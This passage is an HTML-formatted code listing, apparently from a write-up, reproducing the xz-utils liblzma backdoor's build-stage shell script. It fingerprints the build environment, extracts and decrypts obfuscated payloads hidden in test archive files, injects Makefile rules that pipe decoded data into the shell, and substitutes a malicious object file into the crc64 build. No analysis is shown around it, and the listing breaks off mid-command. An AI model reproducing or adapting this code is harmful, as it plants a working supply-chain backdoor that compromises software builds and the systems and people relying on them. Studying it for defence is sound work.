class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs bash">P=<span class="hljs-string">&quot;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&quot;</span><br>C=<span class="hljs-string">&quot;pic_flag=\&quot; <span class="hljs-variable">$P</span>\&quot;&quot;</span><br>O=<span class="hljs-string">&quot;^pic_flag=\&quot; -fPIC -DPIC\&quot;$&quot;</span><br>R=<span class="hljs-string">&quot;is_arch_extension_supported&quot;</span><br>x=<span class="hljs-string">&quot;__get_cpuid(&quot;</span><br>p=<span class="hljs-string">&quot;good-large_compressed.lzma&quot;</span><br>U=<span class="hljs-string">&quot;bad-3-corrupt_lzma2.xz&quot;</span><br>[ ! $(<span class="hljs-built_in">uname</span>)=<span class="hljs-string">&quot;Linux&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcVq</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -f config.status; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcSS</span><br><span class="hljs-built_in">eval</span> `grep ^LD=\&#x27;\/ config.status`<br><span class="hljs-built_in">eval</span> `grep ^CC=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^GCC=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^srcdir=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^build=\&#x27;x86_64 config.status`<br><span class="hljs-built_in">eval</span> `grep ^enable_shared=\&#x27;<span class="hljs-built_in">yes</span>\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^enable_static=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^gl_path_map=\&#x27; config.status`<br>vs=`grep -broaF <span class="hljs-string">&#x27;~!:_ W&#x27;</span> <span class="hljs-variable">$srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$vs</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f1=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>start=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f2) + 7`<br>ve=`grep -broaF <span class="hljs-string">&#x27;|_!&#123; -&#x27;</span> <span class="hljs-variable">$srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$ve</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f2=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>[ ! <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> = <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>[ ! -f <span class="hljs-variable">$f1</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>end=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f2) - <span class="hljs-variable">$start</span>`<br><span class="hljs-built_in">eval</span> `<span class="hljs-built_in">cat</span> <span class="hljs-variable">$f1</span> | <span class="hljs-built_in">tail</span> -c +<span class="hljs-variable">$&#123;start&#125;</span> | <span class="hljs-built_in">head</span> -c +<span class="hljs-variable">$&#123;end&#125;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot;</span> <span class="hljs-string">&quot;\0-\377&quot;</span> | xz -F raw --lzma2 -dc`<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKccj</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&#x27;\[&quot;HAVE_FUNC_ATTRIBUTE_IFUNC&quot;\]=&quot; 1&quot;&#x27;</span> config.status &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&#x27;define HAVE_FUNC_ATTRIBUTE_IFUNC 1&#x27;</span> config.h &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$enable_shared</span>&quot;</span> != <span class="hljs-string">&quot;xyes&quot;</span>;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! (<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$build</span>&quot;</span> | grep -Eq <span class="hljs-string">&quot;^x86_64&quot;</span> &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$build</span>&quot;</span> | grep -Eq <span class="hljs-string">&quot;linux-gnu$&quot;</span> &gt; /dev/null 2&gt;&amp;1);<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$x</span>&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$GCC</span>&quot;</span> != <span class="hljs-string">&#x27;xyes&#x27;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$CC</span>&quot;</span> != <span class="hljs-string">&#x27;xgcc&#x27;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>LDv=<span class="hljs-variable">$LD</span><span class="hljs-string">&quot; -v&quot;</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-variable">$LDv</span> 2&gt;&amp;1 | grep -qs <span class="hljs-string">&#x27;GNU ld&#x27;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$srcdir</span>/tests/files/<span class="hljs-variable">$p</span>&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$srcdir</span>/tests/files/<span class="hljs-variable">$U</span>&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$srcdir</span>/debian/rules&quot;</span> || <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$RPM_ARCH</span>&quot;</span> = <span class="hljs-string">&quot;xx86_64&quot;</span>;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcst</span><br>j=<span class="hljs-string">&quot;^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$j</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>z=<span class="hljs-string">&quot;^am__uninstall_files_from_dir = &#123;&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$z</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>w=<span class="hljs-string">&quot;^am__install_max =&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$w</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>E=<span class="hljs-variable">$z</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$E</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>Q=<span class="hljs-string">&quot;^am__vpath_adj_setup =&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$Q</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>M=<span class="hljs-string">&quot;^am__include = include&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$M</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>L=<span class="hljs-string">&quot;^all: all-recursive$&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$L</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>m=<span class="hljs-string">&quot;^LTLIBRARIES = \$(lib_LTLIBRARIES)&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$m</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>u=<span class="hljs-string">&quot;AM_V_CCLD = \$(am__v_CCLD_\$(V))&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$u</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$O</span>&quot;</span> libtool &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcTy</span><br>b=<span class="hljs-string">&quot;am__test = <span class="hljs-variable">$U</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$j</span>/i<span class="hljs-variable">$b</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>d=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$gl_path_map</span> | sed <span class="hljs-string">&#x27;s/\\\/\\\\\\\\/g&#x27;</span>`<br>b=<span class="hljs-string">&quot;am__strip_prefix = <span class="hljs-variable">$d</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$w</span>/i<span class="hljs-variable">$b</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>b=<span class="hljs-string">&quot;am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$E</span>/i<span class="hljs-variable">$b</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>b=<span class="hljs-string">&quot;\$(top_srcdir)/tests/files/\$(am__test)&quot;</span><br>s=<span class="hljs-string">&quot;am__test_dir=<span class="hljs-variable">$b</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$Q</span>/i<span class="hljs-variable">$s</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>h=<span class="hljs-string">&quot;-Wl,--sort-section=name,-X&quot;</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LDFLAGS</span>&quot;</span> | grep -qs -e <span class="hljs-string">&quot;-z,now&quot;</span> -e <span class="hljs-string">&quot;-z -Wl,now&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>h=<span class="hljs-variable">$h</span><span class="hljs-string">&quot;,-z,now&quot;</span><br><span class="hljs-keyword">fi</span><br>j=<span class="hljs-string">&quot;liblzma_la_LDFLAGS += <span class="hljs-variable">$h</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$L</span>/i<span class="hljs-variable">$j</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>sed -i <span class="hljs-string">&quot;s/<span class="hljs-variable">$O</span>/<span class="hljs-variable">$C</span>/g&quot;</span> libtool || <span class="hljs-literal">true</span><br>k=<span class="hljs-string">&quot;AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))&quot;</span><br>sed -i <span class="hljs-string">&quot;s/<span class="hljs-variable">$u</span>/<span class="hljs-variable">$k</span>/&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>l=<span class="hljs-string">&quot;LTDEPS=&#x27;\$(lib_LTDEPS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export top_srcdir=&#x27;\$(top_srcdir)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export CC=&#x27;\$(CC)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export DEFS=&#x27;\$(DEFS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export DEFAULT_INCLUDES=&#x27;\$(DEFAULT_INCLUDES)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export INCLUDES=&#x27;\$(INCLUDES)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_CPPFLAGS=&#x27;\$(liblzma_la_CPPFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export CPPFLAGS=&#x27;\$(CPPFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export AM_CFLAGS=&#x27;\$(AM_CFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export CFLAGS=&#x27;\$(CFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export AM_V_CCLD=&#x27;\$(am__v_CCLD_\$(V))&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_LINK=&#x27;\$(liblzma_la_LINK)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export libdir=&#x27;\$(libdir)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_OBJECTS=&#x27;\$(liblzma_la_OBJECTS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_LIBADD=&#x27;\$(liblzma_la_LIBADD)&#x27;; \\\\\n\</span><br><span class="hljs-string">sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1&quot;</span>;<br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$m</span>/i<span class="hljs-variable">$l</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcHD</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">elif</span> (<span class="hljs-built_in">test</span> -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (<span class="hljs-built_in">test</span> -f .libs/liblzma_la-crc32_fast.o); <span class="hljs-keyword">then</span><br>vs=`grep -broaF <span class="hljs-string">&#x27;jV!.^%&#x27;</span> <span class="hljs-variable">$top_srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$vs</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f1=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>start=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f2) + 7`<br>ve=`grep -broaF <span class="hljs-string">&#x27;%.R.1Z&#x27;</span> <span class="hljs-variable">$top_srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$ve</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f2=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>[ ! <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> = <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>[ ! -f <span class="hljs-variable">$f1</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>end=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f2) - <span class="hljs-variable">$start</span>`<br><span class="hljs-built_in">eval</span> `<span class="hljs-built_in">cat</span> <span class="hljs-variable">$f1</span> | <span class="hljs-built_in">tail</span> -c +<span class="hljs-variable">$&#123;start&#125;</span> | <span class="hljs-built_in">head</span> -c +<span class="hljs-variable">$&#123;end&#125;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot;</span> <span class="hljs-string">&quot;\0-\377&quot;</span> | xz -F raw --lzma2 -dc`<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcKQ</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc64_fast.c; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc32_fast.c; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc_x86_clmul.h; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$x</span>&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc_x86_clmul.h; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$C</span>&quot;</span> ../../libtool; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">echo</span> <span class="hljs-variable">$liblzma_la_LINK</span> | grep -qs -e <span class="hljs-string">&quot;-z,now&quot;</span> -e <span class="hljs-string">&quot;-z -Wl,now&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$liblzma_la_LINK</span> | grep -qs -e <span class="hljs-string">&quot;lazy&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>N=0<br>W=0<br>Y=`grep <span class="hljs-string">&quot;dnl Convert it to C string syntax.&quot;</span> <span class="hljs-variable">$top_srcdir</span>/m4/gettext.m4`<br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcjv</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -z <span class="hljs-string">&quot;<span class="hljs-variable">$Y</span>&quot;</span>; <span class="hljs-keyword">then</span><br>N=0<br>W=88664<br><span class="hljs-keyword">else</span><br>N=88664<br>W=0<br><span class="hljs-keyword">fi</span><br>xz -dc <span class="hljs-variable">$top_srcdir</span>/tests/files/<span class="hljs-variable">$p</span> | <span class="hljs-built_in">eval</span> <span class="hljs-variable">$i</span> | LC_ALL=C sed <span class="hljs-string">&quot;s/\(.\)/\1\n/g&quot;</span> | LC_ALL=C awk <span class="hljs-string">&#x27;BEGIN&#123;FS=&quot;\n&quot;;RS=&quot;\n&quot;;ORS=&quot;&quot;;m=256;for(i=0;i&lt;m;i++)&#123;t[sprintf(&quot;x%c&quot;,i)]=i;c[i]=((i*7)+5)%m;&#125;i=0;j=0;for(l=0;l&lt;8192;l++)&#123;i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;&#125;&#125;&#123;v=t[&quot;x&quot; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &quot;%c&quot;,(v+k)%m&#125;&#x27;</span> | xz -dc --single-stream | ((head -c +<span class="hljs-variable">$N</span> &gt; /dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>) &amp;&amp; head -c +<span class="hljs-variable">$W</span>) &gt; liblzma_la-crc64-fast.o || true<br>if ! test -f liblzma_la-crc64-fast.o; then<br>exit <span class="hljs-number">0</span><br>fi<br>cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true<br>V=&#x27;#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) &#123; int success = 1; uint32_t r[4]; success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(<span class="hljs-number">0</span>))-16); const uint32_t ecx_mask = (1 &lt;&lt; <span class="hljs-string">1) | (1</span> &lt;&lt; <span class="hljs-string">9) | (1 &lt;&lt; 19); return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; &#125;\n#else\n#define _is_arch_extension_supported is_arch_extension_supported&#x27;</span><br><span class="hljs-string">eval $yosA</span><br><span class="hljs-string">if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc64_fast.c | \</span><br><span class="hljs-string">sed &quot;/include \&quot;crc_x86_clmul.h\&quot;/a \\$V&quot; | \</span><br><span class="hljs-string">sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc64_fast.c\&quot;&quot; 2&gt;/dev/null | \</span><br><span class="hljs-string">$CC $DEFS $DEFAULT_INCLUDES $INCLUDES 